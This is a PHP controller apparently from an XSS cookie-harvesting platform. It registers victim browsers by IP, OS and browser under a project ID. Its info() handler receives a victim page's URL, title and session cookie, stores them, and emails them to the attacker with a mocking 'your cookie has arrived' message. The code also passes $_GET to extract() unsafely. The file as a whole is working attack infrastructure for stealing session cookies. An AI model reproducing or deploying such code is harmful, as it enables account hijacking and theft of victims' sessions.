<?php
class  IndexAction  extends  Action{

	function   index(){

		$uid=$_GET['u'];
		$i=$_GET['i'];

		if($uid){


			$project=new ProjectModel();

			$pid=$project->url_to_pid($uid);

			if($pid){

					

				load_lib('Browser');
				$ip=get_client_ip();
				$type=htmlentities(Browser::get_client_browser());
				$os=htmlentities(Browser::get_clinet_os());
				$browser=new  BrowserModel($ip,$type,$os,$pid);
				if($browser->bid){

			 


				}else{// 注册

					$browser->reg();
					//发送邮件




				}

				if(!$browser->bid)  exit();  // 退出处理

				//上线部分完毕


				include view_file();
			}else{

				header("Location:?m=xing");

			}

		}else if($i){  //邀请码注册


			header("Location:?m=user&a=reg&i=".$i);



		}else{

			header("Location:?m=xing");

		}

	}

	function  info(){

		$bid=intval($_GET['bid']);
		extract($_GET,EXTR_SKIP);

		if($bid){



	 $info=new InfoModel($bid);

	 $info->set(htmlentities($title),htmlentities($url),htmlentities($cookie));

	  $browser=new BrowserModel();
	  $data=$browser->fetch_first("*",array("bid"=>$bid));
	  
	  $uid=M("Project")->fetch_first("uid",array("pid"=>$data['pid']));
 
    
	  $email=M("User")->fetch_first("email",array("uid"=>$uid['uid']));
	  $email=$email['email'];
	  
	  if($url &&  $cookie  && ($data['active']==0) ){
	  	 
	   $browser->login($bid);

	   $title="[".date("Y-m-d H:i:s",time())."] 亲爱的".$_COOKIE['xing_name'].": 您要的cookie到了";


	   $content="
            开门    您的cookie到了  </br>
     url:{$url} </br>
     cookie:{$cookie} </br>
            具体请见".SITE_ROOT."包邮哦  亲 !!!! ";
   
 
	   
	   if($email){

	 
	   	if(SAE){
	   		// sae  发送邮件
           send_sae_mail($email, $title, $content);

	   	}else{
	   		
	   	  send_mail( $email,$title,$content);

	   	}


	   }
	    

	  }

	 }
	 	




	}


 


}
